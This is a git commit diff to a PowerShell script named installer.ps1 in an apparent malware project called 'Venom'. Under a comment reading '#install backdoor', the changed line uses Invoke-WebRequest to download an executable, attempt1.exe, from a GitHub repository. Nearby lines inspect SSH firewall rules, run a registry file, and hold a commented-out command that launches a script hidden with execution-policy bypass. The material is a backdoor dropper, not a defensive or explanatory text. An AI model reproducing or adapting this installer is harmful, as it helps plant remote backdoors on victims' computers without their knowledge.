e613814bfee14ddab70e1fdec83e33b9ad78c605
pokemonunleashed <pokemonunlaeshed@proton.me>
2025-01-27 05:35:37 -0500

    Change of plans2

--- Venom/files/installer.ps1
+++ Venom/files/installer.ps1
@@ -63,7 +63,7 @@ Get-NetFirewallRule -Name *ssh*
 ./wrev.reg; ./calty
 
 #install backdoor
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/exe/attempt1.exe -OutFile "attempt1.exe"
+Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/exe/attempt1.exe -OutFile "attempt1.exe"
 
 #powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.ps1
 
